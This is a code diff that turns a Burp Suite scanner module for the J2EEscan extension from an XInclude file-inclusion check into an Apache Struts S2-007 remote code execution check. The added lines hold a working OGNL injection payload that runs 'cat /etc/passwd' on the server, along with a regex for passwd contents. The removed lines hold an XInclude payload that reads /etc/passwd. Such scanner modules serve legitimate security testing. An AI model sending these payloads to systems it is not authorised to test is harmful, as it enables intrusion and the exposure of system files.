@@ -17,37 +17,29 @@ import java.util.Arrays;
 import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+import java.io.PrintWriter;
 
-/**
- *
- * This module detect remote XML library parser with support of XInclude
- * capability
- *
- * This vulnerability usually could lead to Local File Include issues
- */
-public class XInclude implements IModule {
+public class ApacheStrutsS2007 implements IModule {
 
-    private static final String TITLE = "XML Security - XInclude Support";
-    private static final String DESCRIPTION = "J2EEscan verified XInclude functionality into the remote "
-            + "XML parser; it's possible "
-            + "to abuse this capability to execute LFI attacks."
-            + "<br /><br />"
+    private static final String TITLE = "Apache Struts S2-007 Remote Code Execution";
+    private static final String DESCRIPTION = "J2EEscan identified RCE in the webpage"
             + "<b>References</b>:<br /><br />"
-            + "https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing<br />"
-            + "http://vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf<br />";
+            + "http://struts.apache.org/docs/s2-007.html<br />"
+            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-007<br />"
+            + "https://www.cnblogs.com/LittleHann/p/4640789.html";
+    private PrintWriter stderr;
+    private static final String REMEDY = "Upgrade to latest Apache Struts version";
 
-    private static final String REMEDY = "It's reccomended to disable <code>XInclude</code> capability support.";
-    
-    private static final List<Pattern> XINCLUDE_REGEX = Arrays.asList(
+    private static final List<Pattern> PASSWORDFILE_REGEX = Arrays.asList(
             Pattern.compile("root:.*:0:[01]:", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
-            // TODO FIXME Disable these patterns to avoid FP
+    // TODO FIXME Disable these patterns to avoid FP
 
-            //Pattern.compile("file not found", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
-            //Pattern.compile("java\\.io\\.FileNotFoundException", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
+    //Pattern.compile("file not found", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
+    //Pattern.compile("java\\.io\\.FileNotFoundException", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
 
-    private static final List<byte[]> XINCLUDE_INJ_TESTS = Arrays.asList(
-            "<xi:include href=\"file:///etc/passwd\" parse=\"text\"/>".getBytes());    
-    
+    private static final List<byte[]> PAYLOAD_INJ = Arrays.asList(
+            "' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat /etc/passwd').getInputStream())) + '\n".getBytes());
+
     public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
 
         IExtensionHelpers helpers = callbacks.getHelpers();
@@ -55,21 +47,16 @@ public class XInclude implements IModule {
         IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
         URL curURL = reqInfo.getUrl();
 
-        // Skip test if there is no XML request body
-        if (IRequestInfo.CONTENT_TYPE_XML != reqInfo.getContentType()){
-            return issues;
-        }
-        
-         
-        for (byte[] INJ_TEST : XINCLUDE_INJ_TESTS) {
+        for (byte[] INJ_TEST : PAYLOAD_INJ) {
             // make a request containing our injection test in the insertion point
             byte[] checkRequest = insertionPoint.buildRequest(INJ_TEST);
+
             IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                     baseRequestResponse.getHttpService(), checkRequest);
 
             String response = helpers.bytesToString(checkRequestResponse.getResponse());
 
-            for (Pattern xincludeMatcher : XINCLUDE_REGEX) {
+            for (Pattern xincludeMatcher : PASSWORDFILE_REGEX) {
 
                 Matcher matcher = xincludeMatcher.matcher(response);
 
@@ -82,7 +69,7 @@ public class XInclude implements IModule {
                             TITLE,
                             DESCRIPTION,
                             REMEDY,
-                            Risk.Medium,
+                            Risk.High,
                             Confidence.Certain
                     ));
 
@@ -90,7 +77,7 @@ public class XInclude implements IModule {
                 }
             }
         }
-        
+
         return issues;
     }
 }
